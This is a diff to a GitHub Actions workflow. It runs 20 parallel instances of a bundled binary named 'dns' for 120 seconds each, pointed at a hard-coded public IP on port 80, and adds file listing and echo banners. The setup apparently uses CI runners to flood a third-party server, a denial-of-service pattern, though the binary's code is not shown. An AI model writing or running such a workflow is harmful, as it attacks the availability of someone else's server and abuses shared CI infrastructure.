@@ -1,4 +1,4 @@
-name: Run 20 Instances Auto (120s)
+name: Run 20 DNS Instances (120s)
 
 on:
   push:
@@ -24,10 +24,16 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
+      - name: Show files
+        run: ls -la
+
       - name: Make dns executable
         run: chmod +x ./dns
 
       - name: Run dns (120s)
         run: |
+          echo "======================================"
           echo "Starting instance ${{ matrix.instance }}"
+          echo "======================================"
           timeout 120s ./dns 157.90.149.73 80 120
+          echo "Instance ${{ matrix.instance }} finished"
